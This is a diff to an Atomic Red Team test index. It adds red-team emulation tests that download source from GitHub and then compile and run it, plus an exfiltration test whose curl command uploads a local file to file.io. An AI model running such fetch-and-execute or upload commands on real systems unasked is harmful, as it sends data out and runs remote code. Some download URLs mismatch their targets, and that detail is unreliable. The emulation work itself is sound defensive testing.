@@ -22903,6 +22903,96 @@ defense-evasion:
 
 '
         name: powershell
+    - name: C compile
+      auto_generated_guid: d0377aa6-850a-42b2-95f0-de558d80be57
+      description: 'Compile a c file with either gcc or clang on Linux or Macos.
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        input_file:
+          description: source file
+          type: Path
+          default: PathToAtomicsFolder/T1027.004/src/T1027-004-test.c
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'the source file must exist on disk at specified location (#{input_file})
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c
+          -OutFile #{input_file}
+
+'
+      executor:
+        command: |
+          gcc #{input_file} && ./a.out
+          clang #{input_file} && ./a.out
+        name: bash
+    - name: CC compile
+      auto_generated_guid: da97bb11-d6d0-4fc1-b445-e443d1346efe
+      description: 'Compile a c file with either gcc or clang on Linux or Macos.
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        input_file:
+          description: source file
+          type: Path
+          default: PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'the source file must exist on disk at specified location (#{input_file})
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c
+          -OutFile #{input_file}
+
+'
+      executor:
+        command: |
+          g++ #{input_file} && ./a.out
+          clang++ #{input_file} && ./a.out
+        name: bash
+    - name: Go compile
+      auto_generated_guid: 78bd3fa7-773c-449e-a978-dc1f1500bc52
+      description: 'Compile a c file with either gcc or clang on Linux or Macos.
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        input_file:
+          description: source file
+          type: Path
+          default: PathToAtomicsFolder/T1027.004/src/T1027-004-test.go
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'the source file must exist on disk at specified location (#{input_file})
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c
+          -OutFile #{input_file}
+
+'
+      executor:
+        command: 'go run #{input_file}
+
+'
+        name: bash
   T1218.001:
     technique:
       id: attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d
@@ -70892,7 +70982,29 @@ exfiltration:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1048.002
+    atomic_tests:
+    - name: Exfiltrate data HTTPS using curl
+      auto_generated_guid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
+      description: 'Exfiltrate data HTTPS using curl to file share site file.io
+
+'
+      supported_platforms:
+      - windows
+      - macos
+      - linux
+      input_arguments:
+        input_file:
+          description: Test file to upload
+          type: Path
+          default: PathToAtomicsFolder/T1048.002/files/artifact
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'curl -F ''file=@#{input_file}'' -F ''maxDownloads=1'' -F ''autoDelete=true''
+          https://file.io/
+
+'
   T1011.001:
     technique:
       external_references:
